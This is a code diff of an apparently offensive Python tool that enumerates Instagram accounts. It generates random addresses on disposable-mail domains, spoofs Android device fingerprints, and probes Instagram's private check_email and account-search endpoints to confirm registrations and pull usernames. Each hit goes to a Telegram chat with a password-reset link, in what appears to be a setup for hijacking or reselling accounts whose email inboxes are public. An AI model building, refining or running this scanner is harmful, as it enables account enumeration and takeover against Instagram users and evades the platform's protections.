@@ -1690,7 +1690,7 @@ def run_method2_web(token, chat_id, min_followers, stop_event):
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  METHOD 3  —  ULTRA-FAST EMAIL SCANNER
+#  METHOD 3  —  ULTRA-FAST EMAIL SCANNER  (original logic)
 # ══════════════════════════════════════════════════════════════════════════════
 
 _m3_hits         = 0
@@ -1710,28 +1710,29 @@ _m3_used_lock    = Lock()
 
 _M3_DOMAINS = ["@hi2.in", "@telegmail.com", "@mail.com", "@yopmail.com"]
 
+
 def _m3_generate_android_ua():
     devices = [
-        {"brand": "samsung",  "model": "SM-G973F",    "device": "beyond1",  "board": "exynos9820", "cpu": "exynos9820"},
-        {"brand": "samsung",  "model": "SM-A536B",    "device": "a53x",     "board": "s5e8825",    "cpu": "exynos1280"},
-        {"brand": "samsung",  "model": "SM-S918B",    "device": "dm1q",     "board": "kalama",     "cpu": "qcom"},
-        {"brand": "Google",   "model": "Pixel 6",     "device": "raven",    "board": "raven",      "cpu": "gs101"},
-        {"brand": "Google",   "model": "Pixel 7",     "device": "panther",  "board": "panther",    "cpu": "gs201"},
-        {"brand": "Xiaomi",   "model": "M2102J20SG",  "device": "ares",     "board": "mt6893",     "cpu": "mtk"},
-        {"brand": "Xiaomi",   "model": "Redmi Note 10","device": "sweet",   "board": "sm6150",     "cpu": "qcom"},
-        {"brand": "OnePlus",  "model": "ONEPLUS A6003","device": "OnePlus6","board": "sdm845",     "cpu": "qcom"},
-        {"brand": "OPPO",     "model": "CPH2371",     "device": "OP4F1F",   "board": "mt6893",     "cpu": "mtk"},
-        {"brand": "HUAWEI",   "model": "ELE-L29",     "device": "HWELE",    "board": "kirin980",   "cpu": "hisilicon"},
+        {"brand": "samsung",  "model": "SM-G973F",     "device": "beyond1",  "board": "exynos9820", "cpu": "exynos9820"},
+        {"brand": "samsung",  "model": "SM-A536B",     "device": "a53x",     "board": "s5e8825",    "cpu": "exynos1280"},
+        {"brand": "samsung",  "model": "SM-S918B",     "device": "dm1q",     "board": "kalama",     "cpu": "qcom"},
+        {"brand": "Google",   "model": "Pixel 6",      "device": "raven",    "board": "raven",      "cpu": "gs101"},
+        {"brand": "Google",   "model": "Pixel 7",      "device": "panther",  "board": "panther",    "cpu": "gs201"},
+        {"brand": "Xiaomi",   "model": "M2102J20SG",   "device": "ares",     "board": "mt6893",     "cpu": "mtk"},
+        {"brand": "Xiaomi",   "model": "Redmi Note 10","device": "sweet",    "board": "sm6150",     "cpu": "qcom"},
+        {"brand": "OnePlus",  "model": "ONEPLUS A6003","device": "OnePlus6", "board": "sdm845",     "cpu": "qcom"},
+        {"brand": "OPPO",     "model": "CPH2371",      "device": "OP4F1F",   "board": "mt6893",     "cpu": "mtk"},
+        {"brand": "HUAWEI",   "model": "ELE-L29",      "device": "HWELE",    "board": "kirin980",   "cpu": "hisilicon"},
     ]
-    device         = random.choice(devices)
-    android_ver    = random.choice(["10", "11", "12", "13", "14"])
-    api_level      = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_ver]
-    dpi            = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
-    width          = random.choice(["720", "1080", "1440"])
-    height         = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
-    ig_ver         = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
-    locale         = random.choice(["en_US", "en_GB", "ar_SA"])
-    rnd_num        = random.randint(300000000, 400000000)
+    device      = random.choice(devices)
+    android_ver = random.choice(["10", "11", "12", "13", "14"])
+    api_level   = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_ver]
+    dpi         = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
+    width       = random.choice(["720", "1080", "1440"])
+    height      = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
+    ig_ver      = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
+    locale      = random.choice(["en_US", "en_GB", "ar_SA"])
+    rnd_num     = random.randint(300000000, 400000000)
     return (
         f"Instagram {ig_ver} Android ({api_level}/{android_ver}; "
         f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
@@ -1739,8 +1740,14 @@ def _m3_generate_android_ua():
     )
 
 
-def _m3_check_v1(email, session):
-    """V1: Direct Instagram check_email endpoint — no httpx, pure requests."""
+def _m3_gen_session_id():
+    part1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
+    part2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
+    return f"{part1}:{part2}:{random.randint(100, 999)}"
+
+
+def _m3_check_v1(email, client):
+    """V1: Direct Instagram check_email — HTTP/2 via httpx, fastest path."""
     url = "https://i.instagram.com/api/v1/users/check_email/"
     headers = {
         'User-Agent': _m3_generate_android_ua(),
@@ -1749,95 +1756,41 @@ def _m3_check_v1(email, session):
         'accept-language': "en-IN, en-US",
     }
     try:
-        resp = session.post(url, data={"email": email}, headers=headers, timeout=2)
-        try:
-            data = resp.json()
-            if data.get('email_is_taken') is True:
-                return "registered"
-            elif data.get('email_is_taken') is False:
-                return "not_registered"
-        except Exception:
-            pass
-        # Fallback: text-based check for older API responses
-        text = resp.text
-        if '"email_is_taken":true' in text or '"email_is_taken": true' in text:
+        resp = client.post(url, data=f"email={email}", headers=headers, timeout=10)
+        if 'email_is_taken' in resp.text:
             return "registered"
-        if '"email_is_taken":false' in text or '"email_is_taken": false' in text:
+        elif 'available' in resp.text.lower() or 'Email' in resp.text:
             return "not_registered"
         return "check_v2"
     except Exception:
         return "check_v2"
 
 
-def _m3_check_v2(email, session):
-    """V2: Bloks/CAA search endpoint — pure requests fallback."""
+def _m3_check_v2(email, client):
+    """V2: Bloks/CAA search — HTTP/2 fallback, also extracts username."""
     android = "android-" + secrets.token_hex(8)
     device  = str(uuid.uuid4())
     family  = str(uuid.uuid4())
     url     = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
-    params_obj = {
-        "client_input_params": {
-            "aac": json.dumps({
-                "aac_init_timestamp": int(time.time()),
-                "aacjid": str(uuid.uuid4()),
-                "aaccs": secrets.token_urlsafe(32)
-            }, separators=(',', ':')),
-            "flash_call_permissions_status": {
-                "READ_PHONE_STATE": "PERMANENTLY_DENIED",
-                "READ_CALL_LOG": "DENIED",
-                "ANSWER_PHONE_CALLS": "DENIED"
-            },
-            "was_headers_prefill_available": 0,
-            "network_bssid": None,
-            "sfdid": "",
-            "fetched_email_token_list": {},
-            "search_query": email,
-            "auth_secure_device_id": "",
-            "ig_oauth_token": [],
-            "cloud_trust_token": None,
-            "was_headers_prefill_used": 0,
-            "sso_accounts_auth_data": [],
-            "encrypted_msisdn": "",
-            "device_network_info": None,
-            "text_input_id": "akyuf0:61",
-            "zero_balance_state": None,
-            "android_build_type": "release",
-            "accounts_list": [],
-            "is_oauth_without_permission": 0,
-            "ig_android_qe_device_id": device,
-            "gms_incoming_call_retriever_eligibility": "client_not_supported",
-            "search_screen_type": "email_or_username",
-            "is_whatsapp_installed": 1,
-            "lois_settings": {"lois_token": ""},
-            "ig_vetted_device_nonce": None,
-            "headers_infra_flow_id": "",
-            "fetched_email_list": []
-        },
-        "server_params": {
-            "event_request_id": str(uuid.uuid4()),
-            "is_from_logged_out": 0,
-            "layered_homepage_experiment_group": None,
-            "device_id": android,
-            "login_surface": "login_home",
-            "waterfall_id": str(uuid.uuid4()),
-            "INTERNAL__latency_qpl_instance_id": 6.3987980400102e13,
-            "is_platform_login": 0,
-            "context_data": "",
-            "login_entry_point": "logged_out",
-            "INTERNAL__latency_qpl_marker_id": 36707139,
-            "family_device_id": family,
-            "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
-            "access_flow_version": "pre_mt_behavior",
-            "is_from_logged_in_switcher": 0,
-            "qe_device_id": device
-        }
-    }
     payload = {
-        'params': json.dumps(params_obj, separators=(',', ':')),
+        'params': (
+            '{"client_input_params":{"search_query":"' + email +
+            '","was_headers_prefill_available":0,"was_headers_prefill_used":0,'
+            '"text_input_id":"akyuf0:61","accounts_list":[],"fetched_email_list":[],'
+            '"fetched_email_token_list":{},"sso_accounts_auth_data":[],"ig_oauth_token":[],'
+            '"auth_secure_device_id":"","encrypted_msisdn":"","is_oauth_without_permission":0,'
+            '"is_whatsapp_installed":1,"is_from_logged_in_switcher":0,'
+            '"flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED",'
+            '"READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"}},'
+            '"server_params":{"event_request_id":"' + str(uuid.uuid4()) +
+            '","is_from_logged_out":0,"device_id":"' + android +
+            '","login_surface":"login_home","waterfall_id":"' + str(uuid.uuid4()) +
+            '","is_platform_login":0,"login_entry_point":"logged_out",'
+            '"family_device_id":"' + family + '","qe_device_id":"' + device + '"}}'
+        ),
         'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
-        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
+        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
     }
-    tz_offset = str(int(datetime.now().astimezone().utcoffset().total_seconds()))
     headers = {
         'User-Agent': _m3_generate_android_ua(),
         'accept-language': "en-IN, en-US",
@@ -1849,12 +1802,12 @@ def _m3_check_v2(email, session):
         'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
         'x-ig-device-id': device,
         'x-ig-family-device-id': family,
-        'x-ig-timezone-offset': tz_offset,
+        'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
         'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
         'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
     }
     try:
-        resp = session.post(url, data=payload, headers=headers, timeout=2)
+        resp = client.post(url, data=payload, headers=headers, timeout=10)
         if email in resp.text:
             username = None
             m = re.search(r'"username"\s*:\s*"([A-Za-z0-9_.]{1,30})"', resp.text)
@@ -1871,22 +1824,25 @@ def _m3_save_hit(token, chat_id, email, method_label="V1", username=None):
     domain  = email.split('@')[1]
     prefix  = email.split('@')[0]
     masked  = f"{prefix[0]}{'*' * max(len(prefix) - 2, 1)}{prefix[-1]}@{domain}"
+    session_id = _m3_gen_session_id()
 
     with _m3_hit_lock:
         _m3_hits  += 1
         _m3_total += 1
         hit_num    = _m3_hits
 
-    profile_line = f"LINK   : https://www.instagram.com/{username}\n" if username else ""
+    profile_line = f"✦ 𝐋𝐈𝐍𝐊      ➤ https://www.instagram.com/{username}\n" if username else ""
     msg = (
-        f"\n\nWEYN M3 — EMAIL SCANNER\n"
-        f"HIT #{hit_num}\n"
-        f"EMAIL  : {email}\n"
-        f"MASKED : {masked}\n"
-        f"STATUS : REGISTERED ({method_label})\n"
+        f"⌈━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 ≫─━─━─━⌉\n\n"
+        f"〔 {domain} 〕\n\n"
+        f"✦ 𝐇𝐈𝐓 #    ➤ {hit_num}\n"
+        f"✦ 𝐄𝐦𝐚𝐢𝐥   ➤ {email}\n"
+        f"✦ 𝐒𝐓𝐀𝐓𝐔𝐒  ➤ REGISTERED ({method_label})\n"
+        f"✦ 𝐌𝐚𝐬𝐤𝐞𝐝  ➤ {masked}\n"
         f"{profile_line}"
-        f"RESET  : https://www.instagram.com/accounts/password/reset/\n"
-        f"_______________________________________\n"
+        f"✦ 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 ➤ {session_id}\n"
+        f"✦ 𝐑𝐄𝐒𝐄𝐓   ➤ https://www.instagram.com/accounts/password/reset/\n\n"
+        f"⌊━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 ≫─━─━─━⌋\n"
         f"BY ~ @jinbelowg @weyn_vouches"
     )
 
@@ -1908,75 +1864,80 @@ def _m3_save_hit(token, chat_id, email, method_label="V1", username=None):
 def _m3_worker(token, chat_id, stop_event):
     global _m3_good_insta, _m3_bad_insta, _m3_bad_email, _m3_scanned
 
-    while not (stop_event and stop_event.is_set()):
-        try:
-            user1 = ''.join(random.choices(string.ascii_lowercase, k=6))
-            user2 = ''.join(random.choices(string.ascii_lowercase, k=6))
-            chosen = random.choice([user1, user2])
+    # One persistent HTTP/2 client per worker — reused across all emails
+    try:
+        client = httpx.Client(http2=True, timeout=10)
+    except Exception:
+        client = httpx.Client(timeout=10)
 
-            with _m3_used_lock:
-                if chosen in _m3_used_emails:
-                    continue
-                _m3_used_emails.add(chosen)
-
-            domain = random.choice(_M3_DOMAINS)
-            email  = chosen + domain
-
-            _m3_scanned += 1
-            _web_state['scanned'] = _m3_scanned
-
+    try:
+        while not (stop_event and stop_event.is_set()):
             try:
-                if stop_event and stop_event.is_set():
-                    break
+                user1  = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
+                user2  = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
+                chosen = random.choice([user1, user2])
 
-                # Fire V1 and V2 in parallel — both checks run simultaneously
-                session1 = _register_session(requests.Session())
-                session2 = _register_session(requests.Session())
-                with ThreadPoolExecutor(max_workers=2) as mini_pool:
-                    f_v1 = mini_pool.submit(_m3_check_v1, email, session1)
-                    f_v2 = mini_pool.submit(_m3_check_v2, email, session2)
-                    result_v1          = f_v1.result()
-                    v2_status, username = f_v2.result()
+                with _m3_used_lock:
+                    if chosen in _m3_used_emails:
+                        continue
+                    _m3_used_emails.add(chosen)
 
-                # V1 says registered — verify with V2 result (already available)
-                if result_v1 == "registered":
-                    if v2_status == "registered":
-                        _m3_good_insta += 1
-                        _web_state['good'] = _m3_good_insta
-                        _m3_save_hit(token, chat_id, email, "V1", username)
-                    elif v2_status == "not_registered":
-                        # V1 false positive — email is not actually taken
+                domain = random.choice(_M3_DOMAINS)
+                email  = chosen + domain
+
+                _m3_scanned += 1
+                _web_state['scanned'] = _m3_scanned
+
+                try:
+                    if stop_event and stop_event.is_set():
+                        break
+
+                    result_v1 = _m3_check_v1(email, client)
+
+                    if result_v1 == "registered":
+                        # Confirm with V2 — also extracts username
+                        v2_status, username = _m3_check_v2(email, client)
+                        if v2_status == "registered":
+                            _m3_good_insta += 1
+                            _web_state['good'] = _m3_good_insta
+                            _m3_save_hit(token, chat_id, email, "V1", username)
+                        elif v2_status == "not_registered":
+                            _m3_bad_insta += 1
+                            _web_state['bad_insta'] = _m3_bad_insta
+                        else:
+                            # V2 inconclusive — trust V1
+                            _m3_good_insta += 1
+                            _web_state['good'] = _m3_good_insta
+                            _m3_save_hit(token, chat_id, email, "V1", username)
+
+                    elif result_v1 == "check_v2":
+                        v2_status, username = _m3_check_v2(email, client)
+                        if v2_status == "registered":
+                            _m3_good_insta += 1
+                            _web_state['good'] = _m3_good_insta
+                            _m3_save_hit(token, chat_id, email, "V2", username)
+                        elif v2_status == "unknown":
+                            _m3_bad_email += 1
+                            _web_state['bad_email'] = _m3_bad_email
+                        else:
+                            _m3_bad_insta += 1
+                            _web_state['bad_insta'] = _m3_bad_insta
+                    else:
                         _m3_bad_insta += 1
                         _web_state['bad_insta'] = _m3_bad_insta
-                    else:
-                        # V2 inconclusive — trust V1
-                        _m3_good_insta += 1
-                        _web_state['good'] = _m3_good_insta
-                        _m3_save_hit(token, chat_id, email, "V1", username)
 
-                # V1 inconclusive — use V2 result (already available, no extra wait)
-                elif result_v1 == "check_v2":
-                    if v2_status == "registered":
-                        _m3_good_insta += 1
-                        _web_state['good'] = _m3_good_insta
-                        _m3_save_hit(token, chat_id, email, "V2", username)
-                    elif v2_status == "unknown":
-                        _m3_bad_email += 1
-                        _web_state['bad_email'] = _m3_bad_email
-                    else:
-                        _m3_bad_insta += 1
-                        _web_state['bad_insta'] = _m3_bad_insta
-                else:
+                except Exception:
                     _m3_bad_insta += 1
                     _web_state['bad_insta'] = _m3_bad_insta
 
             except Exception:
-                _m3_bad_insta += 1
-                _web_state['bad_insta'] = _m3_bad_insta
-
+                time.sleep(0.01)
+                continue
+    finally:
+        try:
+            client.close()
         except Exception:
-            time.sleep(0.01)
-            continue
+            pass
 
 
 def run_method3_web(token, chat_id, stop_event):
